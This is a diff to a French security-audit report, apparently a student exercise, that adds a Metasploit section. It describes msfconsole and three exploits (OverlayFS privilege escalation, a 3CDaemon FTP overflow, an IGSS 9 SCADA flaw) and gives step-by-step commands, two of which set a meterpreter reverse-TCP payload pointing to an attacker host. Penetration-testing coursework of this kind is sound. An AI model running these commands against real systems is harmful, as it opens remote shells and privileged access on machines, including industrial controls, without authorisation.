@@ -224,10 +224,46 @@ De cette facon, la liste de vérification pourra guider l'audit de sécurité no
 
 ## **5. Tests d’Intrusion et d’Attaques**
 
-Le principe de cet partie répose sur l'utilisation de Metasploit pour simuler des attaques contrôlées. Pour ce faire nous allons donc utiliser les commandes suivantes :
+Le principe de cet partie répose sur l'utilisation de l'outil Metasploit pour simuler des attaques contrôlées en réalisant des tests d'intrusion pour exploiter des vulnérabilités. Pour ce faire nous allons donc utiliser les commandes suivantes :
 
    ![Résultat de la commande metasploit1](commande_metasploit.png)
    ![Résultat de la commande metasploit2](commande_metasploit2.png)
+
+La première image renvoie vers l'interface d'accueil de Metasploit Frameworkc, la commande "msfconsole" est donc l'interface principale en CLI de Metasploit et elle permet aux utilisateurs de rechercher des exploits, payloads, modules, de configurer des paramètres pour des exploits et de lancer des attaquess sur des cibles particulières. En ce qui concerne les informations importantes que la commande retourne on constate qu'elle propose 2466 exploits, 1273 auxiliaires, 393 modules post-exploitation, 1475 payloads, 49 encoders, 13 NOPs, et 9 modules d'évasion pour tester, exploiter et contourner des vulnérabilités et systèmes de sécurité.
+
+La deuxième image exécute Metasploit en mode silencieux (paramètre "-q") pour rechercher des exploits et sauvegarder les résultats dans un fichier texte (ici metasploit.txt) avec une redirection du chemin de la sortie. En examinant le fichier généré [metasploit.txt](metasploit.txt), voici un exemple de l'analyse des exploits pertinents :
+
+- Exploit "exploit/linux/local/cve_2021_3493_overlayfs" : Cet exploit divulgué le 12/04/2021 permet une élévation des privilèges sur les systèmes Ubuntu étant affectés par une vulnérabilité dans OverlayFS. Cet exploit pourrait utilisé pour obtenir des privilèges administrateur.
+- Exploit "exploit/windows/ftp/3cdaemon_ftp_user" : Cet exploit divulgué le 04/01/2005 cible une vulnérabilité de dépassement de tampon dans le serveur FTP 3CDaemon. Si la faille se retrouve exploitée, elle pourrait être utilisée pour exécuter du code arbitraire.
+- Exploit "exploit/windows/scada/igss9_misc" : Cet exploit divulgué le 24/03/2011 exploite des vulnarabilités dans IGSS 9, qui pourrait être utilisée pour cibler des environnements SCADA de sorte à obtenir un accès non autorisé/
+
+Pour la partie pratique concernant ces exploits, voici une brève explication des commandes à renseigner pour les exploiter :
+
+- Exploit : exploit/linux/local/cve_2021_3493_overlayfs
+  - msfconsole
+  - use exploit/linux/local/cve_2021_3493_overlayfs
+  - set SESSION [ID de la session active]
+  - run 
+- Exploit : exploit/windows/ftp/3cdaemon_ftp_user
+  - msfconsole
+  - use exploit/windows/ftp/3cdaemon_ftp_user
+  - set RHOST [IP de la cible]
+  - set RPORT [Port FTP de la cible]
+  - set PAYLOAD windows/meterpreter/reverse_tcp
+  - set LHOST [IP de l'attaquant]
+  - set LPORT [Port d'écoute de l'attaquant]
+  - exploit
+- Exploit : exploit/windows/scada/igss9_misc
+  - msfconsole
+  - use exploit/windows/scada/igss9_misc
+  - set RHOST [IP de la cible]
+  - set RPORT [Port utilisé par IGSS]
+  - set PAYLOAD windows/meterpreter/reverse_tcp
+  - set LHOST [IP de l'attaquant]
+  - set LPORT [Port d'écoute de l'attaquant]
+  - exploit
+  
+---
 
 ## **6. Conclusion**
 
